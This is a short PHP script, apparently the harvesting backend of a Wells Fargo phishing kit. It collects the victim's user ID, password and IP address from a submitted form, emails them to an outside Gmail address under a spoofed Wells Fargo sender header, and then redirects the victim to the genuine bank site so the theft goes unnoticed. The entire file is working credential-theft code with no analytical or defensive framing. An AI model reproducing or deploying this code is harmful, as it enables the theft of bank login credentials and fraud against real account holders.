<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------+ Wells Rezult +-----------------\n";
$message .= "User Id : ".$_POST['userid']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------+ RELOADED BY MICOLAX +-----------------\n";
$send = "woodbickel@gmail.com";
$subject = "wellsfargo | $ip";
$headers = "From: MAISIXXX <Membership@wellsfargo.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", "$message", "$headers"); 
header("Location: https://www.wellsfargo.com/");
	  

?>